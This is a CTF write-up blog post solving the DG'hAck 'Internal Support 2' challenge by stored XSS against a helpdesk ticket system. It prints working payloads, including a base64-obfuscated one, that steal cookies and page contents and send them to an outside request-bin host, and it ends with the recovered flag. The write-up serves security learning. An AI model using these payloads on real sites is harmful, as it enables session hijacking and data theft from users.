---
title: "Writeup DG'hAck: Internal Support 2"
date: 2020-11-19T03:45:38+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

This is the second version of the [ticketing system](/blog/writeup-dghack-internal-support-1) presented in the CTF. We are greeted with the exact same interface. So let's try exactly the same payload:

```html
<svg onload="document.body.innerHTML=document.body.innerHTML.concat('<img src=\'https://enx8b5ofkwzw.x.pipedream.net/'.concat(btoa(document.cookie)).concat('\' />'))" />
```

After a few seconds, we manage to steal a cookie! However, we can't use it, as the session is ip-locked:

[![The IP-lock error message](/assets/dghack/internal-support-2-ip-denied.png)](/assets/dghack/internal-support-2-ip-denied.png)

Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page. Let's try reading it using some XHR!

The JS we'll inject is going to be:

```js
var request = new XMLHttpRequest();
request.onreadystatechange = function () {
    var DONE = this.DONE || 4;
    if (this.readyState === DONE){
        var encoded = btoa(request.responseText);
        document.location = 'https://enx8b5ofkwzw.x.pipedream.net?' + encoded;
    }
};
request.open('GET', '/', true);
request.send(null);
```

NOTE : we can't use the `fetch` api, the bot must not be that up to date.

Which translates to this payload:

```html
<svg onload="eval(atob('dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICB2YXIgRE9ORSA9IHRoaXMuRE9ORSB8fCA0OwogICAgaWYgKHRoaXMucmVhZHlTdGF0ZSA9PT0gRE9ORSl7CiAgICAgICAgdmFyIGVuY29kZWQgPSBidG9hKHJlcXVlc3QucmVzcG9uc2VUZXh0KTsKICAgICAgICBkb2N1bWVudC5sb2NhdGlvbiA9ICdodHRwczovL2VueDhiNW9ma3d6dy54LnBpcGVkcmVhbS5uZXQ/JyArIGVuY29kZWQ7CiAgICB9Cn07CnJlcXVlc3Qub3BlbignR0VUJywgJy8nLCB0cnVlKTsKcmVxdWVzdC5zZW5kKG51bGwpOw=='))" />
```

And there we go, after a few seconds, we get our html. In it, we find the todo-list :

```html
<section style="margin-top: 50px;" class="pt-95 pb-100">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-lg-8">
        <div class="section-title pb-20">
          <h4 class="title">TODOLIST</h4>
        </div>
      </div>
    </div>
    <div class="row justify-content-center">
      <div class="col-lg-8">
        <div class="section-title pb-20">

          <p class="text">
            - Fix the kernel panic problem on the servers
          </p>

          <p class="text">
            - Find a solution for the XSS on the helpdesk system
          </p>

          <p class="text">
            - Hide the flag &#34;BEtter_BUT_ST!LL_N0tttttttttt++Prfct!&#34; a little bit better
          </p>

        </div>
      </div>
    </div>
  </div>
</section>
```

Which contains the flag: `BEtter_BUT_ST!LL_N0tttttttttt++Prfct!`.

---

[View all of the DG'hAck articles](/tags/dghack).
